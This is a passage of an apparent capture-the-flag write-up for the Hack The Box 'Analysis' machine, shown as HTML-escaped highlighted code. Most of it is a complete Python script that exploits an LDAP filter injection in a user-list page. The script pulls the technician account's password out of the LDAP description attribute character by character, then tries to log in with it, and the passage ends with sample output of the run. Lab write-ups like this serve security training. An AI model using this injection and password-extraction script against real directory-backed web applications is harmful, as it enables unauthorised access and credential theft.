&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;try_login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;unquote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Login&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Wrong Data&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;modified_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{FUZZ}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;quote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{found_char}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Testing &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; for URL: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modified_url&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modified_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;technician&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestException&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Request failed: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Found char: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;. Resetting iteration&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://internal.analysis.htb/Users/list.php&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;login_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://internal.analysis.htb/employees/login.php&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;technician@analysis.htb&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;max_rounds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;How many rounds? &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;wl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_lowercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_uppercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!@#$%^&amp;amp;*()_+=-&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max_rounds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Round &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; password is: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;. Attempting login...&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;can_login&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;try_login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;can_login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Login successful!&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-] Round &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; login attempt failed with password &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Starting round &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; assuming next character in password is &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%2A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    

    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;unquote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Password is: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here’s the output:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python ldapinject.py
How many rounds? 2
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
Testing @ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%40&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Testing &lt;span class=&quot;c&quot;&gt;# for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%23*)&lt;/span&gt;
Testing &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%24&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
